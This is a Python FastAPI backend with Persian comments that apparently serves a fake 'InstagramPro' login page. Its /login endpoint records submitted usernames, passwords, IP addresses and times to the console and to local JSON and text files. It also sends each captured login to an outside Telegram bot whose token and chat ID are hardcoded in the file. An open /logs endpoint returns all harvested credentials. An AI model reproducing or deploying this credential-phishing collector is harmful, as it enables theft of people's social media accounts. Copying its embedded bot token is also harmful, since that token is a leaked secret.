from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import datetime
import json
import os

app = FastAPI()

# تنظیم CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# تنظیمات تلگرام - مستقیماً در کد قرار بده
TELEGRAM_BOT_TOKEN = "8525769457:AAFVUVwCHHaE-4G01Blo0jUviJHq828O8iE"  # اینجا قرار بده
TELEGRAM_CHAT_ID = "8173080761"              # اینجا قرار بده

# روت اصلی
@app.get("/")
def home():
    return {"status": "InstagramPro API is running"}

@app.post("/login")
async def login(request: Request):
    # دریافت داده‌ها
    data = await request.json()
    username = data.get("username", "")
    password = data.get("password", "")
    product = data.get("product", "بدون محصول")
    
    # اطلاعات کاربر
    ip_address = request.client.host if request.client else "ناشناس"
    time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # ساخت رکورد
    record = {
        "time": time_now,
        "username": username,
        "password": password,
        "product": product,
        "ip": ip_address
    }
    
    # ۱. نمایش در کنسول
    print("\n" + "🎯" * 30)
    print(f"📥 اطلاعات جدید:")
    print(f"   👤 کاربر: {username}")
    print(f"   🔐 رمز: {password}")
    print(f"   🛍️ محصول: {product}")
    print(f"   🌐 آی‌پی: {ip_address}")
    print(f"   ⏰ زمان: {time_now}")
    print("🎯" * 30)
    
    # ۲. ذخیره در فایل JSON
    try:
        with open("logins.json", "r", encoding="utf-8") as f:
            all_data = json.load(f)
    except:
        all_data = []
    
    all_data.append(record)
    
    with open("logins.json", "w", encoding="utf-8") as f:
        json.dump(all_data, f, ensure_ascii=False, indent=2)
    
    # ۳. ذخیره در فایل TXT
    with open("logins.txt", "a", encoding="utf-8") as f:
        line = f"{time_now} | {username} | {password} | {product} | {ip_address}\n"
        f.write(line)
    
    # ۴. ارسال به تلگرام (اگر توکن ست شده)
    telegram_sent = False
    if TELEGRAM_BOT_TOKEN != "توکن_ربات_تلگرام_تو" and TELEGRAM_CHAT_ID != "چت_آیدی_تو":
        telegram_sent = await send_to_telegram(username, password, product, ip_address, time_now)
    
    # پاسخ
    return {
        "success": True,
        "message": "اطلاعات ذخیره شد",
        "telegram": telegram_sent,
        "time": time_now
    }

async def send_to_telegram(username, password, product, ip, time):
    """ارسال به تلگرام"""
    try:
        import requests
        
        message = f"""
🔔 ورود جدید InstagramPro
👤 کاربر: {username}
🔐 رمز: {password}
🛍️ محصول: {product}
🌐 آی‌پی: {ip}
⏰ زمان: {time}
"""
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, json=data, timeout=5)
        return response.status_code == 200
        
    except Exception as e:
        print(f"⚠️ خطای تلگرام: {e}")
        return False

# تست
@app.get("/test")
def test():
    return {"message": "API کار می‌کند!"}

@app.get("/logs")
def get_logs():
    """نمایش لاگ‌ها"""
    try:
        with open("logins.json", "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {"error": "فایل لاگ پیدا نشد"}

# برای اجرای محلی
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)